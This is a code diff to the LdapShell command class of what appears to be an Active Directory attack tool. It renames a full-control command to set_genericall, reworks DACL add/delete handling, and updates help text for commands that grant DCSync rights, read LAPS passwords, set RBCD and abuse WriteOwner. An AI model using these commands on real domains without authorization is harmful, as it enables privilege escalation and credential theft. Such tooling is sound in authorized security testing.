@@ -58,6 +58,7 @@ class LdapShell(cmd.Cmd):
             ret_val = super().onecmd(line)
         except Exception:
             log.error('Failed to execute onecmd()', exc_info=True)
+        self.client.rebind()
         return ret_val
 
     @staticmethod
@@ -506,7 +507,7 @@ class LdapShell(cmd.Cmd):
         else:
             log.info('Unable to Read LAPS Password for Computer')
 
-    def do_grant_control(self, line):
+    def do_set_genericall(self, line):
         args = shlex.split(line)
 
         if len(args) != 1 and len(args) != 2:
@@ -723,31 +724,34 @@ class LdapShell(cmd.Cmd):
             'writetorbcd':'3F78C3E5-F79A-46BD-A0B8-9D18116DDC79',       #ms-DS-AllowedToActOnBehalfOfOtherIdentity
             'writetokeycredlink':'5B47D60F-6090-40B2-9F37-2A4DE88F3063' #ms-Ds-KeyCredentialLink
         }
-
+        object = None
         args = shlex.split(line)
         if len(args) != 4:
             raise Exception(
-                f'Expecting target, grantee, true/false and mask name or ObjectType for ACE modified. Received {len(args)} arguments instead.'
+                f'Expecting target, grantee, add/del and mask name or ObjectType for ACE modified. Received {len(args)} arguments instead.'
             )
         controls = security_descriptor_control(sdflags=0x04)
 
         target_name = args[0]
         grantee_name = args[1]
         flag_str = args[2]
-        if flag_str.lower() == "true":
+        if flag_str.lower() == "add":
             flag = True
-        elif flag_str.lower() == 'false':
+        elif flag_str.lower() == "del":
             flag = False
         else:
             raise Exception('The specified flag must be either true or false')
         mask = args[3]
         if mask.lower() in masks:
             mask=masks[mask.lower()]
-        elif all(c in string.hexdigits+'x' for c in a):
+        elif mask.lower() in objects:
+            object = objects[mask.lower()]
+            mask = None
+        elif all(c in string.hexdigits+'x' for c in mask):
             mask = int(mask,16)
         elif re.fullmatch(r"([\dA-Fa-f]{8})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})([\dA-Fa-f]{8})", mask) is not None:
-            mask = None
             object = mask
+            mask = None
         else:
             raise Exception('Mask or object not specified, use <GenericAll, GenericWrite, WriteOwner...> or '
                             '<0x40000000, 0x10000000...> or <1131f6ad-9c07-11d1-f79f-00c04fc2dcd2, 89e95b76-444d-4c62-991a-0facbeda640c...>')
@@ -786,7 +790,7 @@ class LdapShell(cmd.Cmd):
             if mask:
                 sd['Dacl'].aces.append(self.createACE(sid=grantee_sid, access_mask=mask))
             else:
-                sd['Dacl'].aces.append(self.createACE(sid=grantee_sid, object_type=object))
+                sd['Dacl'].aces.append(self.createACE(sid=grantee_sid, object_type=object, access_mask=32))
             self.client.modify(target.entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
                                controls=controls)
             if self.client.result['result'] == 0:
@@ -795,19 +799,32 @@ class LdapShell(cmd.Cmd):
                 self.process_error_response()
         else:
             new_aces = []
-            for e in sd['Dacl'].aces:
-                if e['Ace']['Sid'].formatCanonical() == grantee_sid and e['Ace']['Mask'].hasPriv(mask):
-                    log.info('ACE found for removal!')
-                elif e['Ace']['Sid'].formatCanonical() == grantee_sid:
-                    try:
-                        if e['Ace']['ObjectType'] == LdapShell.string_to_bin(object):
-                            log.info('ACE found for removal!')
-                        else:
+            if mask:
+                for e in sd['Dacl'].aces:
+                    if e['Ace']['Sid'].formatCanonical() == grantee_sid and e['Ace']['Mask'].hasPriv(mask):
+                        log.info('ACE found for removal!')
+                    elif e['Ace']['Sid'].formatCanonical() == grantee_sid:
+                        try:
+                            if e['Ace']['ObjectType'] == LdapShell.string_to_bin(object):
+                                log.info('ACE found for removal!')
+                            else:
+                                new_aces.append(e)
+                        except:
                             new_aces.append(e)
-                    except:
+                    else:
                         new_aces.append(e)
-                else:
-                    new_aces.append(e)
+            if object:
+                for e in sd['Dacl'].aces:
+                    if e['Ace']['Sid'].formatCanonical() == grantee_sid:
+                        try:
+                            if not e['Ace']['ObjectType'] == LdapShell.string_to_bin(object):
+                                new_aces.append(e)
+                            else:
+                                log.info('ACE found for removal!')
+                        except:
+                            new_aces.append(e)
+                    else:
+                        new_aces.append(e)
 
             sd['Dacl'].aces = new_aces
             self.client.modify(target.entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
@@ -930,9 +947,9 @@ del_dcsync user - Delete DS-Replication right to the selected user.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
-grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
+set_genericall target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_owner target grantee - Abuse WriteOwner privilege.
-dacl_modify - Modify ACE (add/del). Usage: target, grantee, true/false and mask name or ObjectType for ACE modified.
+dacl_modify - Modify ACE (add/del). Usage: target, grantee, add/del and mask name or ObjectType for ACE modified.
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
